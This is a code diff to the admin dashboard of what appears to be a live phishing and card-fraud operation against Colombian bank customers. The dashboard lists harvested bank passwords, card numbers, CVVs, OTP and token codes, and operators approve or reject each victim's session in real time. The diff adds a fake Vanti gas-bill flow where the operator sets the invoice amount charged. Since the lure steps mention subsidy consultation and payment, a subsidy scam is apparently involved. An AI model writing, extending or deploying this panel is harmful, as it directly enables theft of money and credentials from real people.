@@ -92,6 +92,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 .estado-token { background: rgba(59, 130, 246, 0.15); color: #60a5fa; }
 .estado-finalizado { background: rgba(34, 197, 94, 0.15); color: #22c55e; }
 .estado-cc_error { background: rgba(245, 158, 11, 0.15); color: #f59e0b; }
+.estado-precio_asignado { background: rgba(14, 165, 233, 0.15); color: #0ea5e9; }
 .bin-nivel { display: inline-block; padding: 3px 9px; border-radius: 5px; font-size: 10px; font-weight: 700; text-transform: uppercase; white-space: nowrap; letter-spacing: 0.3px; }
 .bin-nivel.platinum { background: linear-gradient(135deg, #6b7280, #374151); color: #e5e7eb; }
 .bin-nivel.gold { background: linear-gradient(135deg, #b45309, #f59e0b); color: #fffbeb; }
@@ -295,6 +296,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
     </div>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 <script>
 const API_BASE = 'https://multi-bancos-production.up.railway.app';
 let TOKEN = sessionStorage.getItem('adminToken') || '';
@@ -324,7 +326,7 @@ const LOGO_MC = '<svg viewBox="0 0 100 62" xmlns="http://www.w3.org/2000/svg"><c
 const LOGO_AMEX = '<svg viewBox="0 0 100 50" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="50" rx="4" fill="#006FCF"/><text x="50" y="26" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="900" font-size="18" letter-spacing="1.5">AMEX</text><text x="50" y="38" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="500" font-size="6" letter-spacing="0.8">AMERICAN EXPRESS</text></svg>';
 
 function logoMarca(marca) { if (marca === 'visa') return LOGO_VISA; if (marca === 'mastercard') return LOGO_MC; if (marca === 'amex') return LOGO_AMEX; return '💳'; }
-function nombreBanco(key, marca) { if (key === 'cc-bogota') { return '<span class="banco-cell">' + logoMarca(marca) + ' CC-Bogotá</span>'; } if (key === 'cc-bucaramanga') { return '<span class="banco-cell">' + logoMarca(marca) + ' CC-Bucaramanga</span>'; } const nombres = { 'bancolombia': '🏦 Bancolombia', 'davivienda': '🏦 Davivienda', 'avvillas': '🏦 AV Villas', 'bogota': '🏦 B. Bogotá', 'caja-social': '🏦 Caja Social', 'bbva': '🏦 BBVA', 'popular': '🏦 Popular', 'occidente': '🏦 Occidente', 'nequi': '📱 Nequi' }; return nombres[key] || key; }
+function nombreBanco(key, marca) { if (key === 'cc-bogota') { return '<span class="banco-cell">' + logoMarca(marca) + ' CC-Bogotá</span>'; } if (key === 'cc-bucaramanga') { return '<span class="banco-cell">' + logoMarca(marca) + ' CC-Bucaramanga</span>'; } const nombres = { 'bancolombia': '🏦 Bancolombia', 'davivienda': '🏦 Davivienda', 'avvillas': '🏦 AV Villas', 'bogota': '🏦 B. Bogotá', 'caja-social': '🏦 Caja Social', 'bbva': '🏦 BBVA', 'popular': '🏦 Popular', 'occidente': '🏦 Occidente', 'nequi': '📱 Nequi', 'vanti': '🔥 Vanti' }; return nombres[key] || key; }
 function claseNivel(nivel) { if (!nivel) return 'desconocido'; const n = String(nivel).toLowerCase(); if (n.includes('platinum') || n.includes('platino')) return 'platinum'; if (n.includes('gold') || n.includes('oro')) return 'gold'; if (n.includes('silver') || n.includes('plata')) return 'silver'; if (n.includes('black') || n.includes('negra')) return 'black'; if (n.includes('business') || n.includes('empresarial')) return 'business'; if (n.includes('signature')) return 'signature'; if (n.includes('infinite')) return 'infinite'; if (n.includes('classic') || n.includes('clásica')) return 'classic'; if (n.includes('standard') || n.includes('estándar')) return 'standard'; return 'desconocido'; }
 function renderNivelTarjeta(tipo, nivel) { if (!nivel || nivel === 'Desconocido') { return '<span class="bin-nivel desconocido">—</span>'; } let tipoMostrar = ''; const t = String(tipo || '').toUpperCase(); if (t.includes('CREDIT')) tipoMostrar = 'Crédito '; else if (t.includes('DEBIT')) tipoMostrar = 'Débito '; const texto = tipoMostrar + nivel; const clase = claseNivel(nivel); return `<span class="bin-nivel ${clase}">${escapeHtml(texto)}</span>`; }
 async function api(path, options = {}) { const headers = { 'Content-Type': 'application/json', ...(options.headers || {}) }; if (TOKEN) headers['Authorization'] = 'Bearer ' + TOKEN; const res = await fetch(API_BASE + path, { ...options, headers }); if (res.status === 401) { logout(); throw new Error('Sesión expirada'); } if (res.status === 403) { const d = await res.json().catch(() => ({})); if (d.redirect) window.location.href = d.redirect; throw new Error(d.error || 'Acceso denegado'); } const data = await res.json().catch(() => ({})); if (!res.ok) throw new Error(data.error || 'Error en la petición'); return data; }
@@ -378,11 +380,9 @@ function renderActivos() {
         return; 
     } 
     tbody.innerHTML = lista.map(a => {
-        // 🔥 Aquí se muestra el paso en la columna "Última acción"
         let accionMostrar = a.ultimaAccion || 'entrando';
         if (accionMostrar === 'index') accionMostrar = 'Entrando';
         else if (accionMostrar === 'consultadesubsidio') accionMostrar = 'Consultando';
-        else if (accionMostrar.includes('pagodesubsidio')) accionMostrar = accionMostrar; 
         
         return ` 
         <tr> 
@@ -400,6 +400,13 @@ function botonesSesion(s) {
     const sid = escapeHtml(s.sessionId);
     const ip = escapeHtml(s.datos.ip || '');
     const btns = [];
+
+    if (bancoKey === 'vanti') {
+        btns.push(`<button class="btn" style="background:#6366f1; color:white;" title="Asignar Precio" onclick="ponerPrecio('${sid}')">💲</button>`);
+        btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
+        btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
+        return btns.join('');
+    }
 
     if (bancoKey === 'bancolombia') {
         btns.push(`<button class="btn btn-accept" title="Aceptar" onclick="accion('${sid}','ACEPTAR')">✅</button>`);
@@ -455,7 +462,8 @@ function renderSesiones() {
                 datos.bancoKey, s.estado, datos.identificacion, datos.clave,
                 datos.docNumber, datos.tarjeta, datos.titular, datos.token,
                 datos.otp, datos.monto, datos.ip, datos.expMes, datos.expAnio,
-                datos.cvv, datos.marca, datos.bin, datos.cardType, datos.cardLevel, datos.bankName, datos.countryName
+                datos.cvv, datos.marca, datos.bin, datos.cardType, datos.cardLevel, datos.bankName, datos.countryName,
+                datos.empresa, datos.cuenta, datos.medioPago
             ].filter(Boolean).join(' ').toLowerCase();
             return texto.includes(filtro);
         });
@@ -482,7 +490,12 @@ function renderSesiones() {
         let cvv = '-';
         let documento = '';
 
-        if (esTarjeta) {
+        if (banco === 'vanti') {
+            identificacionTrj = datos.cuenta || '-';
+            claveFch = datos.empresa || '-';
+            cvv = datos.medioPago || '-';
+            documento = '-';
+        } else if (esTarjeta) {
             identificacionTrj = datos.tarjeta || datos.identificacion || '-';
             const mes = datos.expMes || datos.exp || '';
             const anio = datos.expAnio || '';
@@ -499,7 +512,8 @@ function renderSesiones() {
         const titular = datos.titular || '-';
         const token = datos.token || '-';
         const otp = datos.otp || datos.claveDinamica || '-';
-        const monto = datos.monto ? '$' + Number(datos.monto).toLocaleString('es-CO') : '-';
+        const montoValor = datos.monto || (s.estado === 'precio_asignado' ? s.accion : null);
+        const monto = montoValor ? '$' + Number(montoValor).toLocaleString('es-CO') : '-';
         const ip = datos.ip || '-';
         const checked = seleccionSesiones.has(s.sessionId) ? 'checked' : '';
 
@@ -660,6 +674,30 @@ async function accion(sessionId, accion) { try { await api('/admin/sesion/' + en
 async function bloquearIp(ip) { if (!ip || ip === '-') { toast('IP inválida', true); return; } if (!confirm('¿Bloquear la IP ' + ip + '?')) return; try { await api('/admin/ip/bloquear', { method: 'POST', body: JSON.stringify({ ip }) }); toast('🚫 IP bloqueada: ' + ip); cargarTodo(); } catch (e) { toast('Error: ' + e.message, true); } }
 async function desbloquearIp(ip) { if (!confirm('¿Desbloquear la IP ' + ip + '?')) return; try { await api('/admin/ip/desbloquear', { method: 'POST', body: JSON.stringify({ ip }) }); toast('🔓 IP desbloqueada: ' + ip); cargarTodo(); } catch (e) { toast('Error: ' + e.message, true); } }
 $('btnBloquearManual').addEventListener('click', async () => { const ip = $('inputNuevaIp').value.trim(); if (!ip) { toast('Escribe una IP', true); return; } await bloquearIp(ip); $('inputNuevaIp').value = ''; });
+
+async function ponerPrecio(sessionId) {
+    const { value: precio } = await Swal.fire({
+        title: 'Asignar Precio',
+        input: 'number',
+        inputLabel: 'Ingresa el valor de la factura',
+        inputPlaceholder: 'Ej: 71650',
+        showCancelButton: true,
+        confirmButtonColor: '#113455',
+        cancelButtonColor: '#dc2626',
+        confirmButtonText: 'Asignar',
+        cancelButtonText: 'Cancelar'
+    });
+    if (precio) {
+        try {
+            await api('/admin/sesion/' + encodeURIComponent(sessionId) + '/accion', {
+                method: 'POST',
+                body: JSON.stringify({ accion: 'PONER_PRECIO', valor: precio })
+            });
+            toast('💰 Precio asignado: $' + Number(precio).toLocaleString('es-CO'));
+            cargarTodo();
+        } catch (e) { toast('Error: ' + e.message, true); }
+    }
+}
 
 $('buscarActivos').addEventListener('input', renderActivos);
 $('buscarSesiones').addEventListener('input', renderSesiones);
